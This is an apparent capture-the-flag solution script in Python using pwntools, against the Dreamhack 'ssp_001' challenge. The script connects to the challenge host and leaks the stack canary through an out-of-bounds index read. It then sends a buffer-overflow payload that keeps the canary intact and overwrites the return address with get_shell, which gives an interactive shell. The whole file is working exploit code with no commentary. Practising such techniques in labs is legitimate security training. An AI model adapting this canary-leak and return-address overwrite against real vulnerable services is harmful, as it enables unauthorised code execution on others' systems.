from pwn import *

p = remote('host3.dreamhack.games', 23132)
e = ELF('./ssp_001')

def F(box) :
    p.sendlineafter(b'> ', b'F')
    p.sendafter(b'input : ', box)

def P(idx) :
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b'index : ', str(idx))

def E(name_len, name) :
    p.sendlineafter(b'> ', b'E')
    p.sendlineafter(b'Size : ', str(name_len))
    p.sendafter(b'Name : ', name)


get_shell = e.symbols['get_shell']

canary = b''
for i in range(131, 127, -1) :
    P(i)
    p.recvuntil(b'is : ')
    canary += p.recvn(2)
canary = int(canary, 16)
log.info(hex(canary))

payload = b'A' * 0x40 + p32(canary)
payload += b'A' * 0x8 + p32(get_shell)

E(len(payload) + 1, payload)

p.interactive()